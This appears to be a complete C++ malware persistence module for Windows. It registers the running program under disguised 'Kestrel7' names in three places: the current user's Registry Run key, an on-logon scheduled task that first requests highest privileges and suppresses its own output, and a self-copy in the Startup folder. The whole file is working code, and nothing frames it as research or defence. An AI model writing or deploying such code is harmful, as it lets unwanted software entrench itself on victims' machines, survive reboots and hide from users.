// persistence.cpp - Multi-tier Windows Persistence (Registry, Scheduled Tasks, Startup LNK)
#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include <string.h>

extern "C" {

// 1. Current User Registry Auto-Run
BOOL PersistRegistryRun() {
    HKEY hKey;
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return FALSE;
    
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        LONG res = RegSetValueExA(hKey, "Kestrel7Service", 0, REG_SZ, (const BYTE*)path, (DWORD)(strlen(path) + 1));
        RegCloseKey(hKey);
        return (res == ERROR_SUCCESS);
    }
    return FALSE;
}

// 2. Scheduled Task via Windows schtasks CLI
BOOL PersistScheduledTask() {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return FALSE;
    
    char cmd[1024];
    // Create on-logon task with high privileges or current user fallback
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"Kestrel7SyncTask\" /tr \"\\\"%s\\\"\" /sc onlogon /f /rl HIGHEST >nul 2>&1", path);
    int res = system(cmd);
    if (res != 0) {
        snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"Kestrel7SyncTask\" /tr \"\\\"%s\\\"\" /sc onlogon /f >nul 2>&1", path);
        res = system(cmd);
    }
    return (res == 0);
}

// 3. User Startup Folder Execution
BOOL PersistStartupFolder() {
    char startupPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath) != S_OK) return FALSE;
    
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) return FALSE;
    
    char destPath[MAX_PATH];
    snprintf(destPath, sizeof(destPath), "%s\\Kestrel7Host.exe", startupPath);
    
    return CopyFileA(exePath, destPath, FALSE);
}

void EstablishPersistence() {
    PersistRegistryRun();
    PersistScheduledTask();
    PersistStartupFolder();
}

}
